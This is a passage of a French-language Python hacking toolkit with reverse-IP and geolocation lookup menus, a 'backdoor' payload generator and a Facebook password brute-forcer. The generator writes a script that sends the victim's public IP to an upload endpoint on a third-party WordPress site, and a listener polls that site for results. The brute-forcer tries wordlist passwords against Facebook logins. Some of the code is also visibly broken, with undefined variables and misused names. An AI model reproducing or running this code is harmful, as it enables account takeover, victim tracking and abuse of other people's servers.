			requete = requests.get('https://api.hackertarget.com/reverseiplookup/?q='+cible+'')
			if "error" in requete.text:
				print(" [-] Hote => Inconnu!")
				print(" [-] Veuillez entrer l\'h√¥te sans http ou https")
				print(" [*] Exemple \033[1;91m: google.com")
				print(" [*] A plus Man.")
				raw_input('  [+] Appuyer entrer pour retourner au menu...')
				menu_ip()
			else:
				print(" [*] Enregistrement du resultat de l'h√¥te depuis "+cible+" ...")
				nom ='inverser_de_'+cible+'.txt'
				try:
					os.mkdir('reverse')
					nomfichier = open('reverse/'+nom+'','w')
				except:
					nomfichier = open('reverse/'+nom+'','w')
				nomfichier.write(requete.text)
				nomfichier.close()
				print(" [*] Enregistrer dsous\033[1;91m :",nom)
				print(" [*] Vidage IP de la liste",nom)
				ouvert=open('reverse/'+nom).readlines()
				total=len(ouvert)
				print(" [*] "+str(total)+" Hote charger depuis ",nom)
				print("")
				suite = open('reverse/'+nom)
				for moi in range(total):
					liste = suite.readline().replace('\n','')
					req = requests.get('http://ip-api.com/json/'+liste+'')
					mael = json.loads(req.text)
					try:
						print("  [+] http://"+list+" ‚óè‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚óÑ‚ñ∫",mael["query"])
					except:
						print("  [-] http://"+list+" ‚óè‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚óÑ‚ñ∫ Inconnu!")
				print("\n [*] Terminer.")
				print(" [*] Resultat de l\'h√¥te enregistrer dans => /reverse/"+nom)
				print(" [*] A plus Man.")
				raw_input(' [+] Appuyer entrer pour retourner au menu...')
				menu_ip()
				
		elif "3" in choix:
			cls()
		        print(logo_hote)
			print("  [*] Obtenir l\'h√¥te de "+cible+" ...")
			requetes = requests.get('https://api.hackertarget.com/reverseiplookup/?q='+cible+'')
			if "error" in requetes.text:
				print(" [-] Hote ‚óè‚ïê‚ïê‚óÑ‚ñ∫ Inconnu!")
				print(" [-] Veuillez entrer l\'h√¥te sans http ou https")
				print(" [*] Exemple\033[1;91m : google.com")
				print(" [*] A plus Man.")
				raw_input(' [+] Appuyer entrer pour retourner au menu...')
				menu_ip()
			else:
				cpt=open('faxel.txt','w')
				cpt.write(requetes.text)
				cpt.close()
				print("  [*] Attaquer!")
				print("\n  [*] Obtenir l\'h√¥te + IP + LOCATION √† partir de "+cible+" ...")
				nat = open('faxel.txt').readlines()
				h = len(nat)
				print("  [*] "+str(h)+" Hote charger!\n")
				cap = open('faxel.txt')
				for moi in range(h):
					remplace = cap.readline().replace('\n','')
					try:
						moi = requests.get('http://ip-api.com/json/'+remplace+'')
						if "No" in moi.text:
							print(" [-] Hote ‚óè‚ïê‚óÑ‚ñ∫ Inconnu!")
							print(" [-] Veuillez entrer l\'h√¥te sans http ou https")
							print(" [*] Exemple\033[1;91m :facebook.com")
							print(" [*] A plus Man.")
							raw_input(' [+] Appuyer entrer pour retourner au menu...')
							os.system('rm -rf hote+lock')
							menu_ip()
						else:
							p =json.loads(moi.text)
							requeed = requests.get('http://ipapi.co/'+p["query"]+'/json/')
							r =json.loads(requeed.text)
							try:
								lignes = "‚ïê‚ïê"*30
								print("\033[1;92m  "+lignes)
								print("\033[1;97m‚ïî"+35*"‚ïê"+1*"‚ïê‚ïó")
								print("  [+] Hote             : http://"+remplace)
								print("  [*] Adresse IP       : ",r["ip"])
								print("  [*] Ville            : ",r["city"])
								print("  [*] Code Region      : ",r["region_code"])
								print("  [*] Pays             : ",r["country"])
								print("  [*] Nom du pays      : ",r["country_name"])
								print("  [*] Region           : ",r["region"])
								print("  [*] Langue           : ",r["languages"])
								print("  [*] Code d\'appel    : ",r["country_calling_code"])
								print("  [*] Decalage Horaire : ",r["utc_offset"])
								print("  [*] Code Continental : ",r["continent_code"])
								print("  [*] Devise           : ",r["currency"])
								print("  [*] Latitude         : ",r["latitude"])
								print("  [*] Longitude        : ",r["longitude"])
								print("  [*] Heure locale     : ",r["timezone"])
								print("  [*] Code Postal      : ",r["postal"])
								print("  [*] Dans l\'europe   : ",r["in_eu"])
								print("\033[1;97m‚ïö"+35*"‚ïê"+1*"‚ïê‚ïù")	
							except:
								print(" [-] Hote : "+remplace+" ‚óè‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚óÑ‚ñ∫ Inconnu!")
					except:
						print("  [-] Verifier votre connxeion internet!")
						os.system('rm -rf lock.txt')
						raw_input(' [!] Appuyer entrer pour retourner au menu... ')
						os.system('clear')
						menu_ip()
				print("\n  [*] Terminer.")
				os.system('rm -rf faxel.txt')
				raw_input(' [!] Appuyer entrer pour retourner au menu...')
				menu_ip()		
		else:
			print(" [-] Saisir incorrecte!")
			raw_input(' [!] Appuyer entrer pour retourner au menu...')
			menu_ip()
			
	elif "3" in choisir:
		cls()
		print(logo_mon_ip)
		load(" [*]  Verification de votre adresse IP publique ...")
		time.sleep(1.5)
		print(" [+] Votre adresse IP publique est\033[1;91m :\033[1;96m ‚óè‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚óÑ‚ñ∫"+requests.get('http://ip-api.com/json/').json()["query"])
		print(" [*] Terminer.\n")
		raw_input(" [!] Appuyer entrer pour retourner au menu ...")
		menu_ip()
	elif "4" in choisir:
		cls()
		print(logo_portes)
		horaire()
		print("\033[38;5;214müá®üáÆ\033[1;97m I'm the person whom you can never judge. \033[1;92m üá®üáÆ")
		print("\033[1;97m‚ïî"+31*"‚ïê"+1*"‚ïê‚ïó")
		print("\033[1;97m‚ïë \033[1;92mGenerer des portes derob√©es Py\033[1;97m‚ïë")
		print("\033[1;97m‚ïë                     		 \033[1;97m‚ïë")
		print("\033[1;97m‚ïë \033[1;91m[\033[1;96m1.\033[1;91m]\033[1;97m Generer une charge      \033[1;97m  ‚ïë")
		print("\033[1;97m‚ïë \033[1;91m[\033[1;96m2.\033[1;91m]\033[1;97m Les auditeurs           \033[1;97m  ‚ïë")
		print("\033[1;97m‚ïë	                         \033[1;97m‚ïë")
		print("\033[1;97m‚ïö"+31*"‚ïê"+1*"‚ïê‚ïù")
		print("\033[1;97m‚ïë")
		cos = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂[38;5;245m Mr [38;5;221mFaxel \033[1;31m‚ñ∂‚ñ∂‚ñ∂  \033[1;33m")
		if "1" in cos:
			os.system('clear')
		        print(logo_charge)
			chargeutile= raw_input(' [*] Exemple: macharge\n [+] Nom de la charge utile\033[1;97m >>>>\033[1;97m  ')
			date=raw_input('\n [*] Exemple\033[1;91m:\033[1;97m 1997\033[1;91m/\033[1;92m12\n [+] Date \033[1;91m>>>\033[1;97m')
			load("\n  [*] Generation de votre charge, patientez...")
			try:
				os.mkdir('charge')
				f=open('charge','w')
			except:
				f=open('charge','w')
			f.write('import requests,json\n')
			f.write('charge = "'+chargeutile+'.txt"\n')
			f.write('r=requests.get("http://ip-api.com/json/")\n')
			f.write('data=json.loads(r.text)\n')
			f.write('postip=data["query"]\n')
			f.write("files={'Filedata':(payload,postip,'text/html')}\n")
			f.write('try:\n')
			f.write("	r=requests.post('http://ailisgarcia.com/wp-content/plugins/viral-optins/api/uploader/file-uploader.php',verify = False,files=files)\n")
			f.write('except:\n')
			f.write('	print "[-] Renitialisation de la connexion par paire!" \n')
			f.close()
			od=os.path.getsize('charge')
			print("  [*]  Votre charge utile de "+str(od)+" bytes ...")
			print("  [*]  Chemin : /charge/")
			demande = raw_input('\n [*] Lancer maintenant ? o/N : ')
			if demande == 'o' or demande == 'O' or demande == 'oui' or demande == 'OUI':
				rs = requests.get('http://ailisgarcia.com/wp-content/uploads/'+date+'/'+chargeutile+'.txt')
				if rs.status_code == 200:
					print("  [*] Sessions ouvertes ...")
					print("  [+] IP :"+rs.text)
					for moi in range(1,99999):
						chemin='http://ailisgarcia.com/wp-content/uploads/'+date+'/'+chargeutile+'-'+str(moi)+'.txt'
						try:
							r = requests.get(chemin)
							if r.status_code == 200:
								print("  [*] Sessions "+str(moi)+" ouvertes ...")
								print("  [+] Adresse IP : "+r.text)
							else:
								print("  [-]\033[1;97m Charge utile d\'√©coute "+chargeutile+" ...")
						except:
							print("  [*] Verifier votrre connexion!")
							raw_input('  [!] Appuyer entrer pour retourner au menu ... ')
							menu_ip()
				else:
					while True:
						r = requests.get('http://ailisgarcia.com/wp-content/uploads/'+date+'/'+chargeutile+'.txt')
						if r.status_code == 200:
							print("  [*] Sessions ouvertes ..")
							print("  [+] IP : "+r.text)
							raw_input(' [+] Appuyer entrer pour retourner au menu ... ')
							menu_ip()
						else:
							print("  [-]\033[1;97m Charge utile d\'√©coute "+chargeutile+" ...")
			elif demande == 'n' or demande == 'N' or demande == 'non' or demande == 'NON':
				raw_input(' [+] Appuyer entrer pour retourner au menu ... ')
				menu_ip()
			else:
				print("  [‚ô£] Saisie incorrecte !")
				raw_input('  [+] Appuyer entrer pour retourner au menu .. ')
				menu_ip()
		elif "2" in cos:
			cls()
		        print(logo_auditeur)
			chargeutile = raw_input('  [+] Charge utile\033[1;91m >>>\033[1;97m ')
			date = raw_input('  [*] Date \033[1;91m >>>\033[1;97m ')
			rs=requests.get('http://ailisgarcia.com/wp-content/uploads/'+date+'/'+chargeutile+'.txt')
			if rs.status_code == 200:
				print("  [*] Sessions ouvertes ...")
				print("  [+] IP : "+rs.text)
				for moi in range(1,99999):
					chemin='http://ailisgarcia.com/wp-content/uploads/'+date+'/'+chargeutile+'-'+str(moi)+'.txt'
					try:
						r = requests.get(chemin)
						if r.status_code == 200:
							print("  [*] Sessions "+str(moi)+" ouvertes ...")
							print("  [+] IP : "+r.text)
						else:
							print("  [-] Charge utile d\'√©coute "+chargeutile+" ...")
					except:
						print("  [*] Verifier votre connexion internet!")
						raw_input('  [!] Appuyer entrer pour retourner au menu ... ')
						os.system('clear')
						menu_ip()
			else:
				while True:
					r=requests.get('http://ailisgarcia.com/wp-content/uploads/'+date+'/'+chargeutile+'.txt')
					if r.status_code == 200:
						print("  [*] Sessions ouverte ..")
						print("  [+] IP : "+r.text)
						print("  [‚ô£] Appuyer entrer pour retourner au menu ... ")
						menu_ip()
					else:
						print("  [-] Charge "+chargeutile+" ...")			
		else:
			print("  [-] Saisie incorrecte!")
			raw_input('  [‚ô£] Appuyer entrer pour retourner au menu...')
			menu_ip()			
	elif "5"  in choisir:		
		cls()
		print(logo_menu_ip)
		horaire()
		print("[38;5;214müá®üáÆ\033[1;97m I'm the person whom you can never judge. \033[1;92m üá®üáÆ")
		print("\033[1;97m‚ïî"+22*"‚ïê"+1*"‚ïê‚ïó")
		print("\033[1;97m‚ïë  \033[1;91m[\033[1;96m Menu selection \033[1;91m]\033[1;97m   ‚ïë")
		print("\033[1;97m‚ïë			\033[1;97m‚ïë")
		print("\033[1;97m‚ïë\033[1;91m[\033[1;96m1.\033[1;91m]\033[1;93m Manuelement       \033[1;97m‚ïë")
		print("\033[1;97m‚ïë\033[1;91m[\033[1;96m2.\033[1;91m]\033[1;95m Masse             \033[1;97m‚ïë")
		print("\033[1;97m‚ïë			\033[1;97m‚ïë")
		print("\033[1;97m‚ïö"+22*"‚ïê"+1*"‚ïê‚ïù")
		print("\033[1;97m‚ïë")										
		t=raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂[38;5;245m Mr [38;5;221mFaxel \033[1;31m‚ñ∂‚ñ∂‚ñ∂  \033[1;33m")
		if "1" in t:
			ip = raw_input('\n[*] IP \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m ')
			print("[*] IP de suivi "+ip+"\033[1;94m...")
			rk=requests.get('http://ipapi.co/'+ip+'/json/')
			r=json.loads(rk.text)
			try:
				lignes = "="*40
				print("\033[1;92m"+lignes)
				print("  [*] Adresse IP       :",r["ip"])
				print("  [*] Ville            :",r["city"])
				print("  [*] Code Region      :",r["region_code"])
				print("  [*] Pays             :",r["country"])
				print("  [*] Nom du pays      :",r["country_name"])
				print("  [*] Region           :",r["region"])
				print("  [*] Langue           :",r["languages"])
				print("  [*] Code d\'appel    :",r["country_calling_code"])
				print("  [*] Decalage Horaire :",r["utc_offset"])
				print("  [*] Code Continental :",r["continent_code"])
				print("  [*] Devise           :",r["currency"])
				print("  [*] Latitude         :",r["latitude"])
				print("  [*] Longitude        :",r["longitude"])
				print("  [*] Heure Locale     :",r["timezone"])
				print("  [*] Code Postal      :",r["postal"])
				print("  [*] Dans Eu          :",r["in_eu"])
				print("\033[1;92m  "+lignes)
				print("\n[*] Terminer.")
				raw_input('[‚ô£] Appuyer entrer pour retourner au menu ... ')
				os.system('clear')
				menu_ip()
			except:
				print("  [-] @Ip : "+ip+" ‚óè‚ïê‚ïê‚ïê‚ïê‚ïê‚óÑ‚ñ∫ Inconnu!")
				print("\n [*] Terminer.")
				raw_input('[‚ô£] Appuyer entrer pour retourner au menu ... ')
				menu_ip()
		elif "2" in t:
			ip = raw_input('  [*] LISTE IP\033[1;91m ‚ñ∂‚ñ∂‚ñ∂ \033[1;97m ')
			try:
				noel=open(ip).readlines()
				noelle=len(noel)
				malie=open(ip)
				for k in range(noelle):
					mot = malie.readline().replace('\n','')
					rk=requests.get('http://ipapi.co/'+mot+'/json/')
					r=json.loads(rk.text)
					try:
						lignes="="*40
						print "\033[1;92m  "+lignes
						print("  [*] IP de votre suivi : "+mot+" ...")
						print("\033[1;92m  "+lignes)
						print("\033[1;97m‚ïî"+35*"‚ïê"+1*"‚ïê‚ïó")
						print("  [*] Adresse IP       : ",r["ip"])
						print("  [*] Ville            : ",r["city"])
						print("  [*] Code Region      : ",r["region_code"])
						print("  [*] Pays             : ",r["country"])
						print("  [*] Nom du pays      : ",r["country_name"])
						print("  [*] Region           : ",r["region"])
						print("  [*] Langue           : ",r["languages"])
						print("  [*] Code d\'appel    : ",r["country_calling_code"])
						print("  [*] Decalage Horaire : ",r["utc_offset"])
						print("  [*] Code Continental : ",r["continent_code"])
						print("  [*] Devise           : ",r["currency"])
						print("  [*] Latitude         : ",r["latitude"])
						print("  [*] Longitude        : ",r["longitude"])
						print("  [*] Heure locale     : ",r["timezone"])
						print("  [*] Code Postal      : ",r["postal"])
						print("  [*] Dans l\'europe   : ",r["in_eu"])
						print("\033[1;92m  "+lignes)
					except:
						print("  [-] Hote : "+mot+" ==> Inconnu!")
				print("  [*] Terminer.")
				raw_input(' [‚ô£] Appuyer entrer pour retourner au menu ...')
				menu_ip()
			except:
				print("  [-] Oh merde! Liste '"+ip+"' introuvable.")
				raw_input(' [‚ô£] Appuyer entrer pour retourner au menu...')
				menu_ip()		
	elif "6" in choisir:		
		cls()
		print(logo_menu_ip)
		horaire()
		print("[38;5;214müá®üáÆ\033[1;97m I'm the person whom you can never judge. \033[1;92m üá®üáÆ")
		hote = raw_input('  [+] Hote \033[1;91m ‚ñ∂‚ñ∂‚ñ∂ \033[1;97m  ')
		print("\n [*] Obtention de l'h√¥te de "+hote+" ... ")
		rr=requests.get('https://api.hackertarget.com/reverseiplookup/?q='+hote+'')
		f=open(''+hote+'.txt','w')
		f.write(rr.text)
		f.close()
		h = open(hote+'.txt').readlines()
		moi = len(h)
		print("\n  [*] "+str(moi)+"hote charger!")
		print("\n  [*] "+"Extraction des liens de "+hote)
		d = open(hote+'.txt')
		for ps in range(moi):
			l=d.readline().replace('\n','')
			r=requests.get('https://api.hackertarget.com/pagelinks/?q='+l+'')
			if "no links found" in r.text:
				lignes="\033[1;92m="*10
				print(" ["+lignes+" "+l+"Aucun lien trouver! "+lignes+"]")
			elif "input url is invalid" in r.text:
				print("  [-] "+r.text)
				os.system('rm -rf '+hote+'.txt')
				raw_input('  [+] Appuyer entrer pour retourner au menu ...')
				os.system('rm -rf '+hote+'.txt')
				menu_ip()				
			else:
				ligne ="="*10
				print(" ["+ligne+" "+l+" "+ligne+"]\n")
				print(r.text)
		print("\n  [*] Terminer.")
		os.system('rm -rf '+hote+'.txt')
		raw_input('  [+] Appuyer entrer pour retourner au menu ...')
		menu_ip()	
	elif "7" in choisir:
		cls()
		menu_pirate()				
	elif "0" in choisir:
		Menu_autres_scripts()		
	else:	
		print('\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + choisir + ' \x1b[1;91mindisponible')										
		raw_input('[1;91m[!][48;5;0;38;5;187m Appuyer entrer pour retourner au menu...')
		menu_ip()			
####################################################################################################
####################################################################################################			
def menu_pirate():	
        cls()
	print("""      \033[1;97m ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó \033[1;97m ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó
             \033[1;94m ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó\033[1;91m‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïî‚ïù
             \033[1;94m ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù\033[1;91m‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù 
             \033[1;94m ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó\033[1;91m‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïî‚ïê‚ñà‚ñà‚ïó 
             \033[1;94m ‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù\033[1;91m‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïó
             \033[1;94m ‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù \033[1;91m ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù 
             \033[1;97m	      ############################################
             \033[1;97m              #  \033[1;92mFacebook Brutale Force\033[1;97m,\033[1;91m Mr\033[1;96m Faxel\033[1;97m     #
             \033[1;97m              #  \033[1;92mWhatsApp Contact\033[1;91m :\033[1;93m        +22555709610\033[1;97m #
             \033[1;97m              ############################################ """)
        horaire()
        mael = str(raw_input("\n\033[1;91m[\033[1;97m*\033[1;91m]\x1b[32m ID\x1b[31m ou \033[32;1mNom d\'utilisateur\033[91m : \x1b[36m  "))
        motdepasse = str(raw_input("\n\033[1;91m[\033[1;97m+\033[1;91m]\033[0;1m Mot de passe \x1b[31m : \033[37m"))
        connexion = 'https://www.facebook.com/login.php?login_attempt=1'
        agentutilisateur = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
        # agentutilisateur = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',)]
        choix1()
####################################################################################################		
def choix1():	
        t = str(raw_input("\n\x1b[31m[\x1b[34m?\x1b[31m]\x1b[37m Voulez vous  pirater un compte facebook\x1b[33m..\x1b[31m [\x1b[32mo\x1b[31m/\x1b[34mn\x1b[31m] \x1b[31m: \x1b[37m"))
        if t == 'o' or t == 'O':
            liste_de_mot()
        elif t == 'n' or t == 'N':
            print("\x1b[31mRetour au menu\x1b[33m....")
            menu_ip()
        else:
            print("\x1b[37mChoisissez le bon\x1b[33m....")
            choix1()
####################################################################################################
def liste_de_mot():
        cls()
        h = str(raw_input("\x1b[31m[\x1b[37m?\x1b[31m]\x1b[37m Voulez vous creer une\x1b[31m wordliste\x1b[37m?\x1b[31m [\x1b[32mo\x1b[31m/\x1b[34mn\x1b[31m] \x1b[31m: \x1b[37m "))
        if h == 'o' or h == 'O':
                os.system('nano '+motdepasse)
                choix1()
        elif h == 'n' or h == 'N':
                menu_ip()
        else:
                print ("\x1b[37mChoisissez le bon\x1b[33m...")
                liste_de_mot()
####################################################################################################
def menu_fb():	
        global antoine
        antoine = mechanize.Browser()
        cho = cookielib.LWPCookieJar()
        antoine.set_handle_robots(False)
        antoine.set_handle_redirect(True)
        antoine.set_cookiejar(cho)
        antoine.set_handle_equiv(True)
        antoine.set_handle_referer(True)
        antoine.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        Kouadio()
        faxel1()
        print ("")
        print ("\x1b[31m Aucune liste de mots ne correspond\x1b[33m...")
        print ("")
	raw_input('  [!] Appuyer entrer pour retourner au menu...')
        menu_ip()
####################################################################################################	
def rit(rit_mdp):	
  try:
 	sys.stdout.write("\n\x1b[32m[\033[91m+\033[92m]\033[91;1m [\033[0;1m"+mael+"\033[31m]\033[36;1m J\'ai essayer ==> \033[0;1m "+rit_mdp )
	sys.stdout.flush()
	antoine.addheaders = [('User-agent', random.choice(agentutilisateur))]
	site = antoine.open(connexion)
	antoine.select_form(nr = 0)
	antoine.form['email'] = mael
	antoine.form['pass'] = rit_mdp
	chantal = antoine.submit()
	cache = chantal.geturl()
	if cache != connexion and (not 'login_attempt' in cache):
                        print ("")
			print ("\x1b[31m+-------------------------------------------+")
			mael ("\x1b[37m   M O T  D E  P A S S E  T R O U V E R      ")
			mael ("\033[92m          A V E C   S U C C E S     	     ")
                  	print ("\x1b[31m+-------------------------------------------+")
	         	print ("\x1b[31m[\x1b[37m*\x1b[31m]\033[97m ID / Email cible\x1b[31m : \033[92m {}").format(mael)
        	        print ("\x1b[31m[\x1b[37m*\x1b[31m]\033[97m Mot de passe de votre cible\033[91m : \033[92m {}").format(rit_mdp)
        	        print ("")
			print"[38;5;214müá®üáÆ\033[1;97m I'm the person whom you can never judge. \033[1;92m üá®üáÆ"
        	        raw_input('  [!] Appuyer entrer pour retourner au menu...')
                        menu_ip()
  except KeyboardInterrupt:	
      print("\x1b[31mArret\x1b[33m.......")
      liste_de_mot()
      sys.exit()  
####################################################################################################
def faxel1():	
	global rit_mdp
	mon_mdp = open(motdepasse, "r")
	for rit_mdp in mon_mdp:
		mon_mdp = rit_mdp.replace("\n","")
		rit(rit_mdp)	
####################################################################################################
def Kouadio():	
         global motdepasse
         os.system('clear')
         mael("\033[1;92m  ____             _        _ \033[1;91m       ______ _     ")    
         mael("\033[1;92m |  _ \           | |      | |\033[1;91m      |  ____| |    ")  
         mael("\033[1;92m | |_) |_ __ _   _| |_ __ _| |\033[1;97m______\033[1;91m| |__  | |__  ")
         mael("\033[1;92m |  _ <| '__| | | | __/ _` | |\033[1;97m______\033[1;91m|  __| | '_ \ ")
         mael("\033[1;92m | |_) | |  | |_| | || (_| | |\033[1;91m      | |    | |_) |")
         mael("\033[1;92m |____/|_|   \__,_|\__\__,_|_|\033[1;91m      |_|    |_.__/ ")         
	 horaire()
	 mael("\n\x1b[31m[\x1b[37m*\x1b[31m] \033[37mCod√© par\033[1;91m : \x1b[36m\033[041m Faxel\033[00m  \x1b[31m [\033[1;97m*\x1b[31m] ")
         print("")
	 print("[38;5;214müá®üáÆ\033[1;97m I'm the person whom you can never judge. \033[1;92m üá®üáÆ")
         print("")
         hackers = open(motdepasse, 'r')
         hackers = hackers.readlines()
         print("\033[1;91m[\033[1;93m*\033[1;91m]\033[1;97m ID\033[1;91m/\033[1;97mNom d\'utilisateur de votre cible     \033[91;1m : \033[1;96m  {}".format(mael))
         print("\033[1;91m[\033[1;93m+\033[1;91m]\033[1;97m Nombre de mot de passe disponible actuel\033[91;1m : \033[1;93m ", len(hackers),'\033[1;97m mot de passe')
	 print("")
         mael("\033[1;91m[\033[1;93m#\033[1;91m]\033[1;97m Veuillez patientez le processus de craquage est cours d\'execution\033[93;1m..........")
         print("")
	 print("\033[1;91m[\033[1;93m*\033[1;91m]\033[1;97m Piratage du compte de \033[1;95m{}".format(mael),'\033[1;97m en cours, soyez patient.\033[1;91m[\033[1;93m*\033[1;91m]\033[1;97m')
	 print("")
         raw_input('[!] Appuyer entrer pour retourner au menu...')
         menu_ip()
####################################################################################################
####################################################################################################
def menu_ipt():	
	cls()
	horaire()
	print("[38;5;214müá®üáÆ\033[1;97m I'm the person whom you can never judge. \033[1;92m üá®üáÆ")
	print("[38;5;214m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë\033[1;97m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨\033[1;32m‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè") 
        print("[38;5;214m‚Ä¢_ ___    \033[1;97m___ ____ ____ \033[1;32m____ ____ ____‚Ä¢ " )
        print("[38;5;214m‚Ä¢| |__] __\033[1;97m |  |__/ |__| \033[1;32m|    |___ |__/‚Ä¢ " )
        print("[38;5;214m‚Ä¢| |      \033[1;97m |  |  \ |  | \033[1;32m|___ |___ |  \‚Ä¢ " )   
	print("[38;5;214m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë\033[1;97m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨\033[1;32m‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè\n")
        print("\t\033[38;5;214m \033[1;31m  [\033[1;37m++\033[1;31m]\033[042m \033[1;37m Cod√© par\033[1;31m : \033[38;5;245m Mr \033[38;5;247mFaxel\033[1;31m [\033[1;37m++\033[1;31m] \033[00m")
	print("\033[1;97m‚ïî"+32*"‚ïê"+1*"‚ïê‚ïó")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m01.\033[1;91m][48;5;0;38;5;197m Recherche Quelconque \033[1;97m     ‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m02.\033[1;91m][48;5;0;38;5;198m Recherche DNS \033[1;97m            ‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m03.\033[1;91m][38;5;112m Recherche DNS inverser\033[1;97m    ‚ïë")
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m04.\033[1;91m][38;5;245m Recherche IP Local  \033[1;97m      ‚ïë") 
	print("\033[1;97m‚ïë \033[1;91m[\033[1;96m05.\033[1;91m][38;5;115m Recherche IP inverser \033[1;97m    ‚ïë") 
